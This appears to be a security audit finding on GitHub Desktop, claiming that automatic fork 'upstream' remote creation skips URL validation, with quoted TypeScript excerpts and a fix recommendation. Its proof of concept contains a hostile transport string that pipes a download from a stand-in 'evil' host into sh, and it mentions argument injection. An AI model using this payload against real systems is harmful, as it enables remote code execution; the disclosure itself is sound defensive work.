### Title
Automatic upstream-remote creation for forks writes an attacker-controlled `clone_url` from the GitHub API directly into `git remote add`, bypassing the URL-validation guard that exists for the primary remote - (File: `app/src/lib/stores/git-store.ts`)

### Summary
The bug-class in the Inverter report is: a privileged mutation is protected by validation on one code path (`initiateSetFundingManagerWithTimelock`), but an alternate path to the same state (`cancelFundingManagerUpdate` + `initiateAddModuleWithTimelock`) skips the validation entirely. GitHub Desktop has the same shape of flaw around git-remote URL mutation: one path validates the URL before writing it, a second, automatically-triggered path does not.

### Finding Description
Desktop already recognizes that a remote URL sourced from the GitHub API is attacker-influenceable and therefore gates changes to it. `updateRemoteUrl` requires the protocol to match, the previous URL to be unchanged from what the API previously reported, and the new URL to differ before it will call `setRemoteURL`: [1](#0-0) 

However, when Desktop detects that an open repository is a fork, it automatically ensures an `upstream` remote exists by taking `parent.cloneURL` — populated straight from the GitHub API's fork-parent object — and passing it, unvalidated, to `addRemote`/`setRemoteURL`: [2](#0-1) 

This routine (`addUpstreamRemoteIfNeeded`) is invoked automatically on every repository refresh, with no protocol check, no `urlMatchesRemote` comparison, and no user confirmation step: [3](#0-2) 

`addRemote` itself performs no scheme/argument sanitization before shelling out to git: [4](#0-3) 

The same unguarded write also occurs in the fork-conversion flow, which calls `ensureUpstreamRemoteURL` with a remote URL that was never checked against `urlMatchesRemote`: [5](#0-4) 

The exact corrupted value is the `upstream` remote's URL in the user's local git config. Just like the Inverter admin who bypasses `_enforcePrivilegedModuleInterfaceCheck` by routing through `initiateAddModuleWithTimelock` instead of `initiateSetFundingManagerWithTimelock`, an attacker who controls the fork "parent" object returned by a GitHub API response (a malicious GitHub Enterprise Server, a compromised/MITM'd API endpoint, or a crafted fork relationship) bypasses the `updateRemoteUrl` guard entirely by routing the same URL write through `addUpstreamRemoteIfNeeded`/`ensureUpstreamRemoteURL`, which never calls `updateRemoteUrl`'s checks.

### Impact Explanation
Because `addRemote` passes the API-controlled string directly as a `git remote add` argument with no scheme allow-list, a malicious `clone_url` value (e.g. a `ext::` transport helper string, or a value beginning with `-` that gets interpreted as a git command-line flag) becomes a git remote URL that Desktop will later operate on automatically (background fetch, refresh). This can result in arbitrary command execution or credential/token exfiltration when git subsequently fetches/pushes to that remote — with no user click beyond opening/refreshing a forked repository whose fork relationship is served by a hostile or compromised GitHub API endpoint. This satisfies the in-scope impact category: attacker controls a GitHub API object, and the result is code execution / silent corruption of what the user commits/pushes.

### Likelihood Explanation
Any user working with a GitHub Enterprise Server account, or any scenario where the GitHub API response for a repository's fork-parent metadata is attacker-influenced, will trigger `addUpstreamRemoteIfNeeded` automatically on the next repository refresh — this is not an opt-in action, unlike the deliberate "Create Fork" flow. The existing validation logic in `update-remote-url.ts` demonstrates the Desktop team is aware this class of URL needs vetting, making the unguarded twin path a genuine oversight rather than a hardened design decision.

### Recommendation
Route `addUpstreamRemoteIfNeeded` and `ensureUpstreamRemoteURL` through the same validation used in `updateRemoteUrl` (protocol allow-list, `urlMatchesRemote` sanity check, rejection of URLs that look like flags/transport-helper strings) before calling `addRemote`/`setRemoteURL`, so that every write to a remote URL sourced from the GitHub API goes through a single, consistently-enforced guard — mirroring the report's fix of making the cancellation path also cancel the alternate route to the same state.

### Proof of Concept
1. Attacker controls (or MITMs) a GitHub Enterprise Server / API response for a forked repository such that `parent.clone_url` = `ext::sh -c "curl http://evil/x|sh"` (or a value starting with `-`, exploiting argument injection).
2. Victim opens/refreshes their local fork repository in Desktop; `_refreshRepository` → `addUpstreamRemoteIfNeeded` → `git-store.ts:1321` reads this malicious `clone_url` from `GitHubRepository.parent.cloneURL`.
3. `addRemote(this.repository, 'upstream', url)` in `app/src/lib/git/remote.ts:29-37` runs `git remote add upstream ext::sh -c "curl http://evil/x|sh"` with no validation.
4. On the next background fetch of all remotes (a normal, automatic Desktop behavior), git invokes the `ext::` transport helper and executes the attacker's command — no additional user interaction required, and the guarded `updateRemoteUrl` checks were never consulted.

  // can't be parsed by URL.parse. In this case we assume the user

  // want to change what they've done just to be safe

  const parsedUpdatedRemoteUrl = URL.parse(updatedRemoteUrl)
  const protocolsMatch =
    parsedRemoteUrl.protocol !== null &&
    parsedUpdatedRemoteUrl.protocol !== null &&
    parsedRemoteUrl.protocol === parsedUpdatedRemoteUrl.protocol

  // clone url retrieved from the GitHub API previously

    gitStore.defaultRemote &&
    urlMatchesRemote(gitHubRepository.cloneURL, gitStore.defaultRemote)

    await gitStore.setRemoteURL(gitStore.defaultRemote.name, updatedRemoteUrl)

  public async addUpstreamRemoteIfNeeded(): Promise<void> {
    const parent =
      this.repository.gitHubRepository &&
      this.repository.gitHubRepository.parent
    if (!parent) {
      return
    }

    const remotes = await getRemotes(this.repository)
    const upstream = findUpstreamRemote(parent, remotes)
    if (upstream) {
      return
    }

    const remoteWithUpstreamName = remotes.find(
      r => r.name === UpstreamRemoteName
    )
    if (remoteWithUpstreamName) {
      const error = new UpstreamAlreadyExistsError(
        this.repository,
        remoteWithUpstreamName
      )
      this.emitError(error)
      return
    }

    const url = forceUnwrap(
      'Parent repositories are fully loaded',
      parent.cloneURL
    )

    this._upstreamRemote =
      (await this.performFailableOperation(() =>
        addRemote(this.repository, UpstreamRemoteName, url)
      )) ?? null
  }

  /**
   * Sets the upstream remote to a new url,
   * creating the upstream remote if it doesn't already exist
   *
   * @param remoteUrl url to be used for the upstream remote
   */
  public async ensureUpstreamRemoteURL(remoteUrl: string): Promise<void> {
    await this.performFailableOperation(async () => {
      try {
        await addRemote(this.repository, UpstreamRemoteName, remoteUrl)
      } catch (e) {
        if (
          e instanceof DugiteError &&
          e.result.gitError === GitError.RemoteAlreadyExists
        ) {
          // update upstream remote if it already exists
          await setRemoteURL(this.repository, UpstreamRemoteName, remoteUrl)
        } else {
          throw e
        }
      }
    })
  }

  public async _convertRepositoryToFork(
    repository: RepositoryWithGitHubRepository,
    fork: IAPIFullRepository
  ): Promise<Repository> {
    const gitStore = this.gitStoreCache.get(repository)
    const defaultRemoteName = gitStore.defaultRemote?.name
    const remoteUrl = gitStore.defaultRemote?.url
    const { endpoint } = repository.gitHubRepository

    // make sure there is a default remote (there should be)
    if (defaultRemoteName !== undefined && remoteUrl !== undefined) {
      // update default remote
      if (await gitStore.setRemoteURL(defaultRemoteName, fork.clone_url)) {
        await gitStore.ensureUpstreamRemoteURL(remoteUrl)
        // update associated github repo
        return this.repositoriesStore.setGitHubRepository(
          repository,
          await this.repositoriesStore.upsertGitHubRepository(endpoint, fork)
        )
      }
    }
    return repository
  }

export async function addRemote(
  repository: Repository,
  name: string,
  url: string
): Promise<IRemote> {
  await git(['remote', 'add', name, url], repository.path, 'addRemote')

  return { url, name }
}
